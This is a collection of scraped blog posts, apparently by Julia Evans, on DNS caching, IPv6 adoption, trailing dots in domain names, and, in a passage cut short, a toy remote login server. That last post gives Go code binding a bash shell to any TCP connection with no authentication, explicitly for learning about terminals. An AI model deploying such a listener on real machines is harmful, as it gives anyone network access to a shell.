\n\n"},
{"url": "https://jvns.ca/blog/2021/12/06/dns-doesn-t-propagate/", "title": "DNS \"propagation\" is actually caches expiring", "content": "\n     \n\n Hello! Yesterday I  tweeted this : \n\n I feel like the term \"DNS propagation\" is misleading, like you're not actually waiting for DNS records to \"propagate\", you're waiting for cached records to expire — 🔎Julia Evans🔍 (@b0rk)  December 5, 2021   \n\n and I want to talk about it a little more. This came up because I was showing a\nfriend a demo of how DNS caching works last week, and he realized that what was\nhappening in the demo didn’t line up with his mental model of how DNS worked.\nHe immediately brought this up and adjusted his mental model (“oh, DNS records are\n pulled , not  pushed !“). But this it got me thinking – why did my very\nsmart and experienced friend have an inaccurate mental model for how DNS works\nin the first place? \n\n First – I’m very tired of posts that complain about how people are “wrong” about how a\ngiven piece of technology works without explaining why it’s helpful to be\n“right”. So here’s why I like knowing how DNS works. \n\n having a correct mental model for DNS helps me make updates faster \n\n A common piece of advice I see for handling DNS updates is “wait 24-48 hours”.\nBut I am very impatient, and I do NOT want to wait 48 hours! But if I want to\nconfidently ignore this advice (and I really do!!!), then I have to actually\nunderstand how DNS works. \n\n And it is possible to ignore this “24-48 hours” advice sometimes! It even turns\nout that in some cases (like when creating a record for a new name that didn’t\nhave any records before), you don’t need to wait for DNS updates at all! It’s the best. \n\n And of course, knowing how DNS works makes me much more confident debugging\nDNS problems when things go wrong, which always feels good. \n\n Now that I’ve hopefully made a case for why this is interesting to understand, let’s talk about how DNS updates work! \n\n DNS is pull, not push \n\n When you make a DNS request (for example when you type  google.com  in your\nbrowser), you make a request to a  DNS resolver , like  8.8.8.8 . \n\n When you create a DNS record for a domain, you set the DNS record on an  authoritative nameserver . \n\n There are 2 ways you could imagine this working: \n\n \n When an authoritative nameserver gets an update for a DNS record, it immediately starts pushing updates to every resolver it knows about  (false) \n The authoritative nameserver never pushes updates, it just replies with the current record when it receives a query  (true) \n \n\n In fact, if you create a DNS record, it’s possible that no DNS resolver will\never know about it! For example, I just created a record for a subdomain of\njvns.ca that I will not tell you. Nobody will ever make a DNS query for that\nsubdomain (I’m not going to make one, and you can’t because I didn’t tell you\nwhat it is!), so no resolver knows about it. \n\n new DNS records are actually available instantly \n\n I just created a TXT record at  newrecord.jvns.ca  with the content “i’m a new\nrecord”. Then a few seconds later, I ran  dig txt newrecord.jvns.ca . And it\nworked right away, even though only 10 seconds had passed. I didn’t have to\nwait at all! \n\n This is how CDNs work too – if you request a new resource that hasn’t be\nrequested before, you’ll get it right away. \n\n why DNS updates take time: caching \n\n But when you update a DNS record, it  is  slow! So why is that, if records\ndon’t need time to get pushed out? Well, DNS resolvers like  8.8.8.8  cache DNS\nrecords. \n\n And if those cached records are still valid, they’ll never request a new\nrecord! So a DNS update doesn’t fully take effect until  all cached versions\nof that record have expired . When people say “we’re waiting for DNS to propagate”, what they\nactually mean is “we’re waiting for cached records to expire”. \n\n You might think that if you have a record where the TTL is 60, resolvers will\ncache it for 60 seconds, so you just need to wait 60 seconds for the change to\nbe applied. But that would be too easy! So let’s talk about a few reasons that\ncaches could take a longer time to expire (like an hour or a day). \n\n slow update reason 1: some resolvers ignore TTLs \n\n We said before that for a DNS update to fully take effect, all cached versions\nof that record need to expire. In theory, the TTL (“time to live”) on the\nrecord determines how long resolvers cache your record before. But that would\nbe too easy :( \n\n Instead, very rudely, some resolvers will ignore your TTL and just cache your\nrecord for as long as you feel like! Like 24 hours! \n\n So your DNS records updates might take more time to take effect than you’d\nexpect from the TTL. \n\n slow update reason 2: negative DNS caching \n\n If you query for a DNS record that  doesn’t exist , your resolver might cache the  absence  of that record.\nThis has happened to me a lot of times and it’s always super frustrating – here’s how it goes: \n\n \n I visit  something.mydomain.com  before creating the DNS record \n I create the record \n Then I visit it again. But it doesn’t work for a long time!!! Except after some mysterious amount of time it suddenly starts working?? Why??? \n \n\n One day recently I decided to actually find out why this was happening, found a\nStack Overflow answer talking about it, and of course the answer is in a DNS\nRFC! The  RFC for negative caching \nsays that the TTL for negative caching is “the minimum of the MINIMUM field of\nthe SOA record and the TTL of the SOA itself”. \n\n Let’s see what that is for subdomains of  jvns.ca : \n\n $ dig soa jvns.ca \njvns.ca.\t\t3600\tIN\tSOA\tart.ns.cloudflare.com. dns.cloudflare.com. 2264245811 10000 2400 604800 3600\n \n\n It’s the minimum of the SOA TTL (3600) and the\nlast number in the SOA record’s value (3600). So negative caching will happen\nfor an hour. And sure enough, the last time I caused this problem for myself, I\nwaited an hour and everything worked! Hooray! \n\n While testing this, I noticed that Cloudflare’s resolver (1.1.1.1) doesn’t seem\nto do negative DNS caching, but my ISP’s resolver does. Weird! \n\n slow update reason 3: browser and OS caching \n\n DNS resolvers aren’t the only place DNS records are cached – your browser and\nOS might also be caching DNS records! \n\n For example, in Firefox I sometimes need to press Ctrl+Shift+R to force reload\na page after a DNS change, even if the TTL has expired and there’s a new record\navailable. So Firefox seems to cache a little more aggressively than my DNS\nresolver does. \n\n slow update reason 4: nameserver records are cached for a long time \n\n Just making changes to DNS records is normally relatively fast, as long as you\nhave a short TTL. But changing your domain’s nameservers can take more time. This is because to change your nameservers, 2 things have to happen: \n\n \n Your registrar has to tell your TLD’s nameservers about the new nameservers for your domain (I don’t know exactly how long this takes or why it takes time, but it’s not instant!) \n Resolvers have cached records for your nameserver, and those records need to expire. The TTL on those records is usually something like 1 day, so this can easily take a day. \n \n\n For example, I just changed the nameservers for a domain I don’t use 5 minutes\nago, and step 1 isn’t even done yet! \n\n DNS resolvers are a bit like CDNs \n\n If you already know how content delivery networks work, here’s an analogy! The\nway DNS resolver caching works is similar to how CDN caching work in a couple of ways: \n\n \n they both have an origin server (for DNS, the authoritative name server, for CDNs, the HTTP origin) \n they both expire their caches at some point (for DNS, when the TTL expires or maybe later if that’s the resolver’s policy, and for CDNs based on the HTTP  Cache-Control  header, or whatever the CDN’s policy is) \n \n\n There are differences too – for example, CDNs usually have a way to purge\nrecords (which is VERY useful), and DNS often don’t. Though\n8.8.8.8 seems to have a  “flush cache” feature . And CDNs are\nmuch more centralized. DNS resolvers are much more difficult to work with\nbecause there are thousands of different DNS resolvers run by different\norganizations and running different software and there’s no way to control what\nthey do directly. \n\n the term “DNS propagation” feels misleading to me \n\n I feel like the widespread use of the term “DNS propagation” is a little…\nmisleading? I’m not going to pretend to have a better term, but the reason that\nso many people have an incorrect mental model of how DNS works isn’t because\nthey’re dumb – the “propagation” terminology we use to talk about why DNS\nupdates are slow implies an incorrect mental model!  No wonder people are\nconfused! \n\n For most programmers, “there are a bunch of cached records you have\nno control over and you need to wait for them to expire” is a pretty normal and\napproachable concept! We deal with caching all the time, and we all\nknow why it’s frustrating to deal with. So it seems to me like if we used a\nterm that’s more accurate, people would default to a more correct model of how\nDNS works. \n\n Of course, I’m not sure that the term “DNS propagation” is  why  people like my\nfriend end up with an incorrect mental model for how DNS works. That’s a strong\nstatement and I don’t have a lot of evidence for it! But I did get quite a few\nof responses to my original tweet saying that just that 1 sentence (“you’re not\nactually waiting for DNS records to “propagate”, you’re waiting for cached\nrecords to expire”) cleared up some confusion for them. \n\n And I’m definitely not the first person to think that the term “propagation” is\nmisleading. A couple of examples: \n\n \n DNS propagation does not exist \n this  DNS propagation checker  says on its\nhomepage “While technically DNS  does not propagate , this is the term that\npeople have become familiar with…” \n \n\n okay, DNS records actually do “propagate”. \n\n Okay, so if DNS record don’t “propagate”, why do we use the term “DNS\npropagation?“. There must be a reason, right? Well, I  posted on twitter about\nthis actually , and a few\npeople mentioned that DNS records actually  do  get “pushed out”. But pushing\nout these changes is pretty fast and it’s not why DNS updates are slow. \n\n My understanding of this is that: \n\n \n If you run a big authoritative DNS server, you want to run it globally so\nthat people can get DNS responses quickly no matter where they are in the\nworld \n When there’s an update, it needs to get synced to all the other\nauthoritative servers globally, and that syncing takes time \n \n\n But this delay isn’t what people are referring to when they talk about “DNS\npropagation”. My guess is that in the vast majority of cases, this propagation\ndelay is at most a couple of minutes.  I’ve never actually seen this delay\nhappening in practice when I’ve set a DNS record. \n\n And when people talk about “DNS propagation”, they’re basically always talking\nabout waiting for cached records to expire, which can easily take hours or\ndays. \n\n maybe we use the term “propagation” for historical reasons? \n\n In the 90s, maybe DNS records really did take multiple hours to get\n“propagated” and pushed out, and so it was more accurate to use the term\n“propagation” to describe why you needed to wait? And maybe that’s why we still\nuse the term “propagation” to talk about the reason for DNS delays? I have no\nidea how DNS worked in the 90s though. \n\n this terminology is probably here to stay \n\n I’m not trying to say here that people should stop using the term “DNS\npropagation” to talk about waiting for cached records to expire. I’m probably\ngoing to keep using it sometimes – it’s a very widely used term that a lot of\npeople recognize! And if everyone in the conversation already has an accurate\nunderstanding of how DNS works, using the term “DNS propagation” of course\nisn’t going to suddenly make people forget how DNS actually works :) \n\n But I do think it’s important to recognize when terms we use are potentially\nmisleading. I think I’m going to be more careful about using it in the\nfuture, especially when explaining DNS to people who don’t have a good\nunderstanding of it yet. \n\n that’s all! \n\n I hope that this helps make DNS less mysterious to some of you! \n\n  Thanks to Aditya, Taylor, and Hazem for their comments on a draft of this post  \n\n"},
{"url": "https://jvns.ca/blog/2022/01/29/reasons-for-servers-to-support-ipv6/", "title": "Reasons for servers to support IPv6", "content": "\n     \n\n I’ve been having a hard time understanding IPv6. On one hand, the basics initially seem pretty\nstraightforward (there aren’t enough IPv4 addresses for all the devices on the\ninternet, so people invented IPv6! There are enough IPv6 addresses for\neveryone!) \n\n But when I try to actually understand it, I run into a lot of questions. One\nquestion is:  twitter.com  does not support IPv6. Presumably it can’t be causing\nthem THAT many issues to not support it. So why  do  websites support IPv6? \n\n I asked people on Twitter  why their servers support IPv6 \nand I got a lot of great answers, which I’ll summarize here. These all come\nwith the disclaimer that I have basically 0 experience with IPv6 so I can’t evaluate these reasons very well. \n\n First though, I want to explain why it’s possible for  twitter.com  to not\nsupport IPv6 because I didn’t understand that initially. \n\n how can you tell  twitter.com  doesn’t support IPv6? \n\n You can tell they don’t support IPv6 is because if you look up their AAAA\nrecord (which contains their IPv6 address), there isn’t one. Some other big\nsites like  github.com  and  stripe.com  also don’t support IPv6. \n\n $ dig AAAA twitter.com\n(empty response)\n$ dig AAAA github.com\n(empty response)\n$ dig AAAA stripe.com\n(empty response)\n \n\n why does  twitter.com  still work for IPv6 users? \n\n I found this really confusing, because I’ve always heard that lots of internet\nusers are forced to use IPv6 because we’ve run out of IPv4 addresses. But if\nthat’s true, how could twitter.com continue to work for those people without\nIPv6 support? Here’s what I learned from the Twitter thread yesterday. \n\n There are two kinds of internet service providers (ISPs): \n\n \n ISPs who own enough IPv4 address for all of their customers \n ISPs who don’t \n \n\n My ISP is in category 1 – my computer gets its own IPv4 address, and actually\nmy ISP doesn’t even support IPv6 at all. \n\n But lots of ISPs (especially outside of North America) are in category 2: they\ndon’t have enough IPv4 addresses for all their customers. Those ISPs handle the problem by: \n\n \n giving all of their customers a unique IPv6 address, so they can access IPv6 sites directly \n making large groups of their customers  share  IPv4 addresses. This can either be with CGNAT (” carrier-grade NAT ”) or “464XLAT” or maybe something else. \n \n\n All ISPs need  some  IPv4 addresses, otherwise it would be impossible for their\ncustomers to access IPv4-only sites like twitter.com. \n\n what are the reasons to support IPv6? \n\n Now we’ve explained why it’s possible to  not  support IPv6. So why support it?\nThere were a lot of reasons. \n\n reason: CGNAT is a bottleneck \n\n The argument that was most compelling to me was: CGNAT (carrier-grade NAT) is a\nbottleneck and it causes performance issues, and it’s going to continue to get\nworse over time as access to IPv4 addresses becomes more and more restricted. \n\n Someone also mentioned that because CGNAT is a bottleneck, it’s an attractive\nDDoS target because you can ruin lots of people’s internet experience just by\nattacking 1 server. \n\n Servers supporting IPv6 reduces the need for CGNAT (IPv6 users can just connect\ndirectly!) which makes the internet work better for everyone. \n\n I thought this argument was interesting because it’s a “public commons” /\ncommunity argument – it’s less that supporting IPv6 will make your site\nspecifically work better, and more that if  almost everyone  supports IPv6 then\nit’ll make the experience of the internet better for everyone, especially in\ncountries where people don’t have easy access to IPv4 addresses. \n\n I don’t actually know how much of an issue this is in practice. \n\n There were lots of more selfish arguments to use IPv6 too though, so let’s get\ninto those. \n\n reason: so IPv6-only servers can access your site \n\n I said before that most IPv6 users still have access to IPv4 through some kind\nof NAT. But apparently that’s not true for everyone – some people mentioned\nthat they run some servers which only have IPv6 addresses and which aren’t\nbehind any kind of NAT. So those servers are actually totally unable to access\nIPv4-only sites. \n\n I imagine that those servers aren’t connecting to arbitrary machines that much\n– maybe they only need to connect to a few hosts with IPv6 support. \n\n But it makes sense to me that a machine should be able to access my site even\nif it doesn’t have an IPv4 address. \n\n reason: better performance \n\n For users who are using both IPv4 and IPv6 (with a dedicated IPv6 address and a\nshared IPv4 address), apparently IPv6 is often faster because it doesn’t need\nto go through an extra translation layer. \n\n So supporting IPv6 can make the site faster for users sometimes. \n\n In practice clients use an algorithm called “Happy Eyeballs” which tries to\nfigure out whether IPv4 or IPv6 will be faster and then uses whichever seems\nfaster. \n\n Some other performance benefits people mentioned: \n\n \n maybe sometimes using IPv6 can get you a SEO boost because of the better performance. \n maybe using IPv6 causes you to go through better (faster) network hardware because it’s a newer protocol \n \n\n reason: resilience against IPv4 internet outages \n\n One person said that they’ve run into issues where there was an internet outage\nthat only affected IPv4 traffic, because of accidental BGP poisoning. \n\n So supporting IPv6 means that their site can still stay partially online during\nthose outages. \n\n reason: to avoid NAT issues with home servers \n\n A few people mentioned that it’s much easier to use IPv6 with home servers –\ninstead of having to do port forwarding through your router, you can just give\nevery server a unique IPv6 address and then access it directly. \n\n Of course, for this to work the client needs to have IPv6 support, but more and\nmore clients these days have IPv6 support too. \n\n reason: to learn about IPv6 \n\n One person said they work in security and in security it’s very important to\nunderstand how internet protocols work (attackers are using internet\nprotocols!). So running an IPv6 server helps them learn how it works. \n\n reason: to push IPv6 forward / IPv4 is “legacy” \n\n A couple of people said that they support IPv6 because it’s the current\nstandard, and so they want to contribute to the success of IPv6 by supporting\nit. \n\n A lot of people also said that they support IPv6 because they think sites that only\nsupport IPv4 are “behind” or “legacy”. \n\n reason: it’s easy \n\n I got a bunch of answers along the lines of “it’s easy, why not”. Obviously\nadding IPv6 support is not easy in all situations, but a couple of reasons it\nmight be easy in some cases: \n\n \n you automatically got an IPv6 address from your hosting company, so all you need to do is add an  AAAA  record pointing to that address \n your site is behind a CDN that supports IPv6, so you don’t need to do anything extra \n \n\n reason: safer networking experimentation \n\n Because the address space is so big, if you want to try something out you can\njust grab an IPv6 subnet, try out some things in it, and then literally never\nuse that subnet again. \n\n reason: to run your own autonomous system (AS) \n\n A few people said they were running their own autonomous system (I talked about what an AS is a bit in this  BGP post ). IPv4 addresses are too expensive so they bought IPv6 addresses for their AS instead. \n\n reason: security by obscurity \n\n If your server  only  has a public IPv6 address, attackers can’t easily find it\nby scanning the whole internet. The IPv6 address space is too big to scan! \n\n Obviously this shouldn’t be your only security measure, but it seems like a\nnice bonus – any time I run an IPv4 public server I’m always a tiny bit\nsurprised by how it’s constantly being scanned for vulnerabilities (like old versions of WordPress, etc). \n\n very silly reason: you can put easter eggs in your IPv6 address \n\n IPv6 addresses have a lot of extra bits in them that you can do frivolous\nthings with. For example one of Facebook’s IPv6 addresses is\n“2a03:2880:f10e:83:face:b00c:0:25de” (it has  face:b00c  in it). \n\n there are more reasons than I thought \n\n That’s all I’ve learned about the “why support IPv6?” question so far. \n\n I came away from this conversation more motivated to support IPv6 on my\n(very small) servers than I had been before. But that’s because I think\nsupporting IPv6 will require very little effort for me. (right now I’m using a\nCDN that supports IPv6 so it comes basically for free) \n\n I know very little about IPv6 still but my impression is that IPv6 support\noften isn’t zero-effort and actually can be a lot of work. For example, I have\nno idea how much work it would actually be for Twitter to add IPv6 support on\ntheir edge servers. \n\n supporting IPv6 can also cause problems \n\n A friend who runs a large service told me that their service has tried to add\nIPv6 support multiple times over the last 7 years, but each time it’s caused\nthem problems. What happened to them was: \n\n \n they advertised an AAAA record \n users would get the AAAA record and try to connect to them over IPv6 \n some network equipment in the user’s ISP/internal network somewhere was broken, so the IPv6 connection failed \n as a result those users were unable to use their service \n \n\n I thought it was interesting and surprising that supporting IPv6 can actually\nin some cases make things  worse  for people on dual stack (IPv4 + IPv6)\nnetworks. \n\n some more IPv6 questions \n\n Here are some more IPv6 questions I have that maybe I’ll explore later: \n\n \n what are the  disadvantages  to supporting IPv6? What goes somehow wrong? (here’s one  example of an IPv6 problem  someone linked me to, for example) \n what are the incentives for ISPs that own enough IPv4 addresses for their customers to support IPv6? (another way of asking: is it likely that my ISP will move to supporting IPv6 in the next few years? or are they just not incentivized to do it so it’s unlikely?) \n digital ocean  seems to only support IPv4 floating IPs, not IPv6 floating IPs. Why not? Shouldn’t it be\n easier  to give out IPv6 floating IPs since there are more of them? \n when I try to ping an IPv6 address (like example.com’s IP  2606:2800:220:1:248:1893:25c8:1946  for example) I get the error  ping: connect: Network is unreachable . Why? (answer: it’s because my ISP doesn’t support IPv6 so my computer doesn’t have a public IPv6 address) \n \n\n This  IPv4 vs IPv6 article from Tailscale  looks interesting and answers some of these questions. \n\n"},
{"url": "https://jvns.ca/blog/2022/09/12/why-do-domain-names-end-with-a-dot-/", "title": "Why do domain names sometimes end with a dot?", "content": "\n     \n\n Hello! When I was writing the zine  How DNS Works \nearlier this year, someone asked me – why do people sometimes put a dot at the\nend of a domain name? For example, if you look up the IP for  example.com  by\nrunning  dig example.com , you’ll see this: \n\n $ dig example.com\nexample.com.\t\t5678\tIN\tA\t93.184.216.34\n \n\n dig  has put a  .  to the end of  example.com  – now it’s  example.com. ! What’s up with that? \n\n Also, some DNS tools require domains to have a  \".\"  at the end: if you try to pass  example.com  to  miekg/dns , like this, it’ll fail: \n\n // trying to send this message will return an error\nm := new(dns.Msg)\nm.SetQuestion(\"example.com\", dns.TypeA)\n \n\n Originally I thought I knew the answer to this (“uh, the dot at the end means\nthe domain is fully qualified?“). And that’s true – a fully qualified domain\nname is a domain with a “.” at the end! \n\n But that doesn’t explain  why  dots at the end are useful or important. \n\n in a DNS request/response, domain names don’t have a trailing “.” \n\n I once (incorrectly) thought the answer to “why is there a dot at the end?”\nmight be “In a DNS request/response, domain names have a “.” at the end, so we\nput it in to match what actually gets sent/received by your computer”. But\nthat’s not true at all! \n\n When a computer sends a DNS request or response, the domain names in it don’t\nhave a trailing dot. Actually, the domain names don’t have  any  dots. \n\n Instead, they’re encoded as a series of length/string pairs. For example,\nthe domain  example.com  is encoded as these 13 bytes: \n\n 7example3com0\n \n\n So there are no dots at all. Instead, an ASCII domain name (like “example.com”)\ngets translated into the format used in a DNS request / response by various DNS\nsoftware. \n\n So let’s talk about one place where domain names are translated into DNS responses: zone files. \n\n the trailing “.” in zone files \n\n One way that some people manage DNS records for a domain is to create a text\nfile called a “zone file” and then configure some DNS server software (like  nsd \nor  bind ) to serve the DNS records specified in that zone file. \n\n Here’s an imaginary zone file for  example.com : \n\n orange  300   IN    A     1.2.3.4\nfruit   300   IN    CNAME orange\ngrape   3000  IN    CNAME example.com.\n \n\n In this zone file, anything that doesn’t end in a  \".\"  (like  \"orange\" ) gets\n .example.com  added to it. So  \"orange\"  is shorthand for\n \"orange.example.com\" . The DNS server knows from its configuration that this\nis a zone file for  example.com , so it knows to automatically append\n example.com  at the end of any name that doesn’t end with a dot. \n\n I assume the idea here is just to save typing – you could imagine writing\nthis zone file by fully typing out all of the domain names: \n\n orange.example.com.  300   IN    A     1.2.3.4\nfruit.example.com.   300   IN    CNAME orange.example.com.\ngrape.example.com.   3000  IN    CNAME example.com.\n \n\n But that’s a lot of typing. \n\n you don’t need zone files to use DNS \n\n Even though the zone file format is defined in the official DNS RFC ( RFC 1035 ), you don’t have to\nuse zone files at all to use DNS. For example, AWS Route 53 doesn’t use zone\nfiles to store DNS records! Instead you create records through the web\ninterface or API, and I assume they store records in some kind of database and\nnot a bunch of text files. \n\n Route 53 (like many other DNS tools) does support importing and exporting zone\nfiles though and it can be a good way to migrate records from one DNS provider\nto another. \n\n the trailing “.” in dig \n\n Now, let’s talk about  dig ’s output: \n\n $ dig example.com\n; <<>> DiG 9.18.1-1ubuntu1.1-Ubuntu <<>> +all example.com\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 10712\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 65494\n;; QUESTION SECTION:\n;example.com.\t\t\tIN\tA\n\n;; ANSWER SECTION:\nexample.com.\t\t81239\tIN\tA\t93.184.216.34\n\n \n\n One weird thing about this is that almost every line starts with a  ;; . What’s\nup with that? Well  ;  is the comment character in zone files! \n\n So I think the reason that dig prints out its output in this weird way is so that\nif you wanted, you could just paste this into a zone file and have it work\nwithout any changes. \n\n This also explains why there’s a  .  at the end of  example.com.  – zone files\nrequire a trailing dot at the end of a domain name (because otherwise they’re\ninterpreted as being relative to the zone). So  dig  does too. \n\n I really wish dig had a  +human  flag that printed out all of this information\nin a more human readable way, but for now I’m too lazy to put in the work to\nactually contribute code to do that (and I’m a pretty bad C programmer) so I’ll\njust complain about it on my blog instead :) \n\n the trailing  \".\"  in curl \n\n Let’s talk about another case where the trailing  \".\"  shows up: curl! \n\n One of the computers in my house is called “grapefruit”, and it’s running a\nwebserver. Here’s what happens if I run  curl grapefruit : \n\n $ curl grapefruit\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\">\n\n<html>\n<head>\n \n\n It works! Cool. But what happens if I add a  .  at the end? Suddenly it doesn’t work: \n\n $ curl grapefruit.\ncurl: (6) Could not resolve host: grapefruit.\n \n\n What’s going on? To understand, we need to learn about search domains: \n\n meet search domains \n\n When I run  curl grapefrult , how does that get translated into a DNS request?\nYou might think that my computer would send a request for the domain\n grapefruit , right? But that’s not true. \n\n Let’s use  tcpdump  to see what domain is actually being looked up: \n\n $ sudo tcpdump -i any port 53\n[...] A? grapefruit.lan. (32)\n \n\n It’s actually sending a request for  grapefruit.lan . What’s up with that? \n\n Well, what’s going on is that: \n\n \n To look up  grapefruit ,  curl  calls a function called  getaddrinfo \n getaddrinfo  looks in a file on my computer called  /etc/resolv.conf \n /etc/resolv.conf  contains these 2 lines:\n \nnameserver 127.0.0.53\nsearch lan\n \n Because it sees  search lan ,  getaddrinfo  adds a  lan  at the end of  grapefruit  and looks up  grapefruit.lan  instead \n \n\n when are search domains used? \n\n Now we know something weird: that when we look up a domain, sometimes an extra\nthing (like  lan ) will be added to the end. But when does that happen? \n\n \n If we put a  \".\"  at the  end  of the domain (like  curl grapefruit. , then search domains aren’t used \n If the domain has an  \".\"   inside  it (like  example.com  has a dot in it), then by default search domains aren’t used either. But this can be changed with configuration (see this blog post about  ndots  that talks about this more) \n \n\n So now we know why  curl grapefruit.  has different results than  curl grapefruit  – it’s because one looks up the domain  grapefruit.  and the other one looks up  grapefruit.lan. \n\n how does my computer know what search domain to use? \n\n When I connect to my router, it tells me that its search domain is  lan  with\nDHCP – it’s the same way that my computer gets assigned an IP address. \n\n so why do people put a dot at the end of domain names? \n\n Now that we know about zone files and search domains, here’s why I think people\nlike to put dots at the end of a domain name. \n\n There are two contexts where domain names are modified and get something else added to the end: \n\n \n in a zone file for  example.com ,  grapefruit  get translated to  grapefruit.example.com \n on my local network (with my computer configured to use the search domain  lan ),  grapefruit  gets translated to  grapefruit.lan \n \n\n So because domain names can actually be translated to something else in some\ncases, people like to put a  \".\"  at the end to communicate “THIS IS THE\nDOMAIN NAME, NOTHING GETS ADDED AT THE END, THIS IS THE WHOLE THING”. Because\notherwise it can get confusing. \n\n The technical term for “THIS IS THE WHOLE THING” is  “fully qualified domain\nname”  or  “FQDN” . So  google.com.  is a fully qualified domain name, and\n google.com  isn’t. \n\n I always have to remind myself for the reasons for this because I rarely use\nzone files or search domains, so I often feel like – “of course I mean\n google.com  and not  google.com.something.else ! Why would I mean anything\nelse?? That’s silly!” \n\n But some people do use zone files and search domains (search domains are used\nin Kubernetes, for example!), so the “.” at the end is useful to make it 100%\nclear that nothing else should be added. \n\n when to put a “.” at the end? \n\n Here are a couple of quick notes about when to put a “.” at the end of your domain names: \n\n Yes: when configuring DNS \n\n It’s never bad to use fully qualified domain names when configuring DNS. You\ndon’t always have to: a non-fully-qualified domain name will often work just\nfine as well, but I’ve never met a piece of DNS software that wouldn’t accept a\nfully qualified domain name. \n\n And some DNS software requires it: right now the DNS server I use for  jvns.ca \nmakes me put a  \".\"  at the end of domains names (for example in CNAME records)\nand warns me otherwise it’ll append  .jvns.ca  to whatever I typed in. I don’t\nagree with this design decision but it’s not a big deal, I just put a “.” at\nthe end. \n\n No: in a browser \n\n Confusingly, it often  doesn’t  work to put a  \".\"  at the end of a domain name in a\nbrowser! For example, if I type  https://twitter.com.  into my browser, it\ndoesn’t work! It gives me a 404. \n\n I think what’s going on here is that it’s setting the HTTP Host header to\n Host: twitter.com.  and the web server on the other end is expecting  Host: twitter.com . \n\n Similarly,  https://jvns.ca.  gives me an SSL error for some reason. \n\n I think relative domain names used to be more common \n\n One last thing: I think that “relative” domain names (like me using\n grapefruit  to refer to the other computer in my house,  grapefruit.lan ) used\nto be more commonly used, because DNS was developed in the context of\nuniversities or other big institutions which have big internal networks. \n\n On the internet today, it seems like it’s more common to use “absolute” domain\nnames (like  example.com ). \n\n"},
{"url": "https://jvns.ca/blog/2022/07/28/toy-remote-login-server/", "title": "A toy remote login server", "content": "\n     \n\n Hello! The other day we talked about  what happened when you press a key in your terminal . \n\n As a followup, I thought it might be fun to implement a program that’s like a\ntiny ssh server, but without the security. You can find it  on github here , and I’ll explain how it works in this blog post. \n\n the goal: “ssh” to a remote computer \n\n Our goal is to be able to login to a remote computer and run commands, like you\ndo with SSH or telnet. \n\n The biggest difference between this program and SSH is that there’s literally\nno security (not even a password) – anyone who can make a TCP connection to\nthe server can get a shell and run commands. \n\n Obviously this is not a useful program in real life, but our goal is to learn a\nlittle more about how terminals works, not to write a useful program. \n\n (I will run a version of it on the public internet for the next week though,\nyou can see how to connect to it at the end of this blog post) \n\n let’s start with the server! \n\n We’re also going to write a client, but the server is the interesting part, so\nlet’s start there. We’re going to write a server that listens on a TCP port (I\npicked 7777) and creates remote terminals for any client that connects to it to\nuse. \n\n When the server receives a new connection it needs to: \n\n \n create a pseudoterminal for the client to use \n start a  bash  shell process for the client to use \n connect  bash  to the pseudoterminal \n continuously copy information back and forth between the TCP connection and\nthe pseudoterminal \n \n\n I just said the word “pseudoterminal” a lot, so let’s talk about what that\nmeans. \n\n what’s a pseudoterminal? \n\n Okay, what the heck is a pseudoterminal? \n\n A pseudoterminal is a lot like a bidirectional pipe or a socket – you have two\nends, and they can both send and receive information. You can read more about\nthe information being sent and received in  what happens if you press a key in your terminal \n\n Basically the idea is that on one end, we have a TCP connection, and on the\nother end, we have a  bash  shell. So we need to hook one part of the\npseudoterminal up to the TCP connection and the other end to bash. \n\n The two parts of the pseudoterminal are called: \n\n \n the “pseudoterminal master”. This is the end we’re going to hook up to the TCP connection. \n the “slave pseudoterminal device”. We’re going to set our bash shell’s  stdout ,  stderr , and  stdin  to this. \n \n\n Once they’re conected, we can communicate with  bash  over our TCP connection\nand we’ll have a remote shell! \n\n why do we need this “pseudoterminal” thing anyway? \n\n You might be wondering – Julia, if a pseudoterminal is kind of like a socket,\nwhy can’t we just set our bash shell’s  stdout  /  stderr  /  stdin  to the TCP\nsocket? \n\n And you can! We could write a TCP connection handler like this that does exactly that, it’s not a lot of code ( server-notty.go ). \n\n \nfunc handle(conn net.Conn) {\n\ttty, _ := conn.(*net.TCPConn).File()\n\t// start bash with tcp connection as stdin/stdout/stderr\n\tcmd := exec.Command(\"bash\")\n\tcmd.Stdin = tty\n\tcmd.Stdout = tty\n\tcmd.Stderr = tty\n\tcmd.Start()\n}\n\n \n\n It even kind of works – if we connect to it with  nc localhost 7778 , we can\nrun commands and look at their output. \n\n But there are a few problems. I’m not going to list all of them, just two. \n\n problem 1: Ctrl + C doesn’t work \n\n The way Ctrl + C works in a remote login session is \n\n \n you press ctrl + c \n That gets translated to  0x03  and sent through the TCP connection \n The terminal receives it \n the Linux kernel on the other end notes “hey, that was a Ctrl + C!” \n Linux sends a  SIGINT  to the appropriate process (more on what the “appropriate process” is exactly later) \n \n\n If the “terminal” is just a TCP connection, this doesn’t work, because when you\nsend  0x04  to a TCP connection, Linux won’t magically send  SIGINT  to any\nprocess. \n\n problem 2:  top  doesn’t work \n\n When I try to run  top  in this shell, I get the error message  top: failed tty get . If we strace it, we see this system call: \n\n ioctl(2, TCGETS, 0x7ffec4e68d60)        = -1 ENOTTY (Inappropriate ioctl for device)\n \n\n So  top  is running an  ioctl  on its output file descriptor (2) to get some\ninformation about the terminal. But Linux is like “hey, this isn’t a terminal!”\nand returns an error. \n\n There are a bunch of other things that go wrong, but hopefully at this point\nyou’re convinced that we actually need to set bash’s stdout/stderr to be a\nterminal, not some other thing like a socket. \n\n So let’s start looking at the server code and see what creating a\npseudoterminal actually looks like. \n\n step 1: create a pseudoterminal \n\n Here’s some Go code to create a pseudoterminal on Linux. This is copied from  github.com/creack/pty ,\nbut I removed some of the error handling to make the logic a bit easier to follow: \n\n pty, _ := os.OpenFile(\"/dev/ptmx\", os.O_RDWR, 0)\nsname := ptsname(p)\nunlockpt(p)\ntty, _ := os.OpenFile(sname, os.O_RDWR|syscall.O_NOCTTY, 0)\n \n\n In English, what we’re doing is: \n\n \n open  /dev/ptmx  to get the “pseudoterminal master” Again, that’s the part we’re going to hook up to the TCP connection \n get the filename of the “slave pseudoterminal device”, which is going to be  /dev/pts/13  or something. \n “unlock” the pseudoterminal so that we can use it. I have no idea what the point of this is (why is 